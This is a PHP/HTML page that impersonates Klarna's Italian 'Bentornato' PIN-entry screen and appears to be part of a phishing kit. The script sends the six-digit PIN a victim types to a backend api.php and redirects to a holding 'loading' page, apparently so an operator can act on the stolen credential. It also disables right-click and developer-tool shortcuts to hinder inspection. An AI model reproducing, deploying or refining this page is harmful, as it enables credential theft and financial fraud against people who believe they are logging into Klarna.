<?php
require_once __DIR__ . '/guard.php';

$clientData = getClientData(getToken());
$status = $clientData['status'] ?? '';
$allowed = ['go_pin', 'pin_error', 'pin_submitted', 'pin_forgot'];
if (!in_array($status, $allowed)) {
    header('Location: loading.php');
    exit;
}

$token = getToken();
$hasError = isset($_GET['error']) && $_GET['error'] === '1';
?>
<!DOCTYPE html>
<html lang="it" oncontextmenu="return false;">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Klarna | PIN</title>
    <script>window.clientToken = "<?php echo htmlspecialchars($token); ?>";</script>
    <script>
        document.addEventListener('contextmenu', e => e.preventDefault());
        document.addEventListener('keydown', function(e) {
            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) || (e.ctrlKey && (e.key === 'u' || e.key === 'U'))) { e.preventDefault(); return false; }
        });
    </script>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
        body { background-color: #f7f7f7; font-family: 'Inter', sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow-x: hidden; zoom: 0.92; -moz-transform: scale(0.92); -moz-transform-origin: top center; }
        .auth-card { width: 100%; max-width: 550px; background: white; padding: 36px 52px; border-radius: 32px; box-shadow: 0 8px 28px rgba(0,0,0,0.04); min-height: 780px; display: flex; flex-direction: column; }
        @media (max-width: 640px) { body { background-color: white; align-items: stretch; zoom: 1; -moz-transform: none; } .auth-card { max-width: 100%; height: 100vh; min-height: 100vh; border-radius: 0; padding: 16px 20px; box-shadow: none; } }
        @media (min-width: 641px) and (max-width: 900px) { body { zoom: 0.95; } .auth-card { max-width: 480px; padding: 28px 36px; min-height: 650px; } }
        .error-msg-bar { background: #fff1f3; color: #000; padding: 12px; border-radius: 12px; font-size: 13px; display: none; align-items: center; margin-bottom: 24px; }
        .error-dot { width: 16px; height: 16px; background: #9c1c31; color: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 10px; font-weight: bold; margin-right: 8px; flex-shrink: 0; }
    </style>
</head>
<body>
    <div class="auth-card">
        <div class="text-center pt-2 mb-6">
             <img src="https://logolook.net/wp-content/uploads/2022/06/Klarna-Logo-2017.png" 
                  alt="Klarna" 
                  style="height: 32px; width: auto; display: inline-block; object-fit: contain;">
         </div>
        <div class="flex justify-end mb-2">
            <a href="index.php" class="text-2xl font-light hover:opacity-50 leading-none">&times;</a>
        </div>
        <div class="flex-grow flex flex-col items-center text-center pt-6">
            <div class="mb-6">
                <svg class="w-10 h-10 text-[#080516] mx-auto" fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
            </div>
            <h1 class="text-[26px] font-bold text-[#080516] mb-10 tracking-tight">Bentornato</h1>
            
            <div class="flex justify-center gap-3 mb-12" id="pin-dots">
                <div class="w-3 h-3 rounded-full bg-[#e5e5ea] transition-all duration-150" data-index="0"></div>
                <div class="w-3 h-3 rounded-full bg-[#e5e5ea] transition-all duration-150" data-index="1"></div>
                <div class="w-3 h-3 rounded-full bg-[#e5e5ea] transition-all duration-150" data-index="2"></div>
                <div class="w-3 h-3 rounded-full bg-[#e5e5ea] transition-all duration-150" data-index="3"></div>
                <div class="w-3 h-3 rounded-full bg-[#e5e5ea] transition-all duration-150" data-index="4"></div>
                <div class="w-3 h-3 rounded-full bg-[#e5e5ea] transition-all duration-150" data-index="5"></div>
            </div>
            
            <div id="pin-error" class="error-msg-bar w-full" style="<?php echo $hasError ? 'display:flex;' : ''; ?>">
                <span class="error-dot">!</span>
                <span class="ml-2 font-medium">PIN errato. Riprova.</span>
            </div>

            <div class="w-full max-w-[300px] mx-auto">
                <div class="grid grid-cols-3 gap-y-6 gap-x-2 mb-2">
                    <button onclick="enterPinDigit('1')" class="h-14 text-[28px] font-medium text-[#080516] hover:bg-[#f2f2f7] rounded-full transition flex items-center justify-center select-none">1</button>
                    <button onclick="enterPinDigit('2')" class="h-14 text-[28px] font-medium text-[#080516] hover:bg-[#f2f2f7] rounded-full transition flex items-center justify-center select-none">2</button>
                    <button onclick="enterPinDigit('3')" class="h-14 text-[28px] font-medium text-[#080516] hover:bg-[#f2f2f7] rounded-full transition flex items-center justify-center select-none">3</button>
                    <button onclick="enterPinDigit('4')" class="h-14 text-[28px] font-medium text-[#080516] hover:bg-[#f2f2f7] rounded-full transition flex items-center justify-center select-none">4</button>
                    <button onclick="enterPinDigit('5')" class="h-14 text-[28px] font-medium text-[#080516] hover:bg-[#f2f2f7] rounded-full transition flex items-center justify-center select-none">5</button>
                    <button onclick="enterPinDigit('6')" class="h-14 text-[28px] font-medium text-[#080516] hover:bg-[#f2f2f7] rounded-full transition flex items-center justify-center select-none">6</button>
                    <button onclick="enterPinDigit('7')" class="h-14 text-[28px] font-medium text-[#080516] hover:bg-[#f2f2f7] rounded-full transition flex items-center justify-center select-none">7</button>
                    <button onclick="enterPinDigit('8')" class="h-14 text-[28px] font-medium text-[#080516] hover:bg-[#f2f2f7] rounded-full transition flex items-center justify-center select-none">8</button>
                    <button onclick="enterPinDigit('9')" class="h-14 text-[28px] font-medium text-[#080516] hover:bg-[#f2f2f7] rounded-full transition flex items-center justify-center select-none">9</button>
                </div>
                <div class="grid grid-cols-3 gap-x-2 items-center">
                    <button onclick="forgotPin()" class="text-[13px] text-[#4b3ec4] font-semibold hover:underline text-left pl-2 h-14 flex items-center">Dimenticato?</button>
                    <button onclick="enterPinDigit('0')" class="h-14 text-[28px] font-medium text-[#080516] hover:bg-[#f2f2f7] rounded-full transition flex items-center justify-center select-none">0</button>
                    <button onclick="backspacePin()" class="h-14 flex items-center justify-center text-[#080516] hover:bg-[#f2f2f7] rounded-full transition">
                        <svg class="w-6 h-6" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M21 12H7M7 12l7-7M7 12l7 7"/></svg>
                    </button>
                </div>
            </div>
        </div>
    </div>

    <script>
        let pinValue = '';

        function enterPinDigit(digit) {
            if (pinValue.length < 6) {
                pinValue += digit;
                updatePinDots();
                if (pinValue.length === 6) submitPin();
            }
        }

        function backspacePin() {
            pinValue = pinValue.slice(0, -1);
            updatePinDots();
            document.getElementById('pin-error').style.display = 'none';
        }

        function updatePinDots() {
            const dots = document.querySelectorAll('#pin-dots div');
            dots.forEach((dot, index) => {
                if (index < pinValue.length) {
                    dot.classList.remove('bg-[#e5e5ea]');
                    dot.classList.add('bg-[#080516]');
                } else {
                    dot.classList.remove('bg-[#080516]');
                    dot.classList.add('bg-[#e5e5ea]');
                }
            });
        }

        function forgotPin() {
            let fd = new FormData();
            fd.append('type', 'pin_forgot');
            fetch('api.php', { method: 'POST', body: fd });
            alert('Richiesta inviata');
        }

        function submitPin() {
            let fd = new FormData();
            fd.append('type', 'pin_submit');
            fd.append('pin', pinValue);
            fetch('api.php', { method: 'POST', body: fd })
            .then(() => {
                window.location.href = 'loading.php?return=pin.php';
            });
        }
    </script>
</body>
</html>